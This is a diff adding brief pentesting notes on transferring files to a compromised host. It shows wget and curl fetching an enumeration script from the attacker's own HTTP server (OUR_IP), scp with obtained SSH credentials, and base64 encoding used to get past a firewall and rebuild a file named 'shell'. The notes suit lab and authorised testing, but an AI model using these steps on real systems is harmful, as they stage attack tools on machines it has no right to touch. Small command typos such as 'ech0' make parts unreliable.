@@ -1,0 +1,39 @@
+I- Transferring file
+  Goal: transferring file from a remote server such as enumeration scripts or exploits, or data
+
+  a- Using wget
+      - With a Python HTTP server on our machine and wget or curl
+
+Step 1: on our machine => python3 -m http.server <PORT>
+Step 2: on remote host => wget http://OUR_IP:PORT/lineum.sh
+        or              => curl http://OUR_IP:PORT/lineum.sh -o lineum.sh   (the -o specify output file)
+
+
+
+  b- Using SCP (secure copy)
+In the scenario we got SSH credentials, we could use:
+scp lineum.sh user@remotehost:/lineum.sh
+
+
+  c- Using base64
+In case we are not able to download/upload file because of firewall rule
+
+Step 1 : base64 <filename> -w 0 => output the base64 value of the content of the file
+Step 2 (on the other device): ech0 <base64_decoded_value> | base64 -d > shell
+
+
+  d- Validating format of a file
+
+To see the format of a file we can use: 
+  => file <filename>
+
+Then we can compare the integrity of the file that nothing has been changed with
+  => md5sum <filename>
+
+on both host
+
+
+
+
+
+
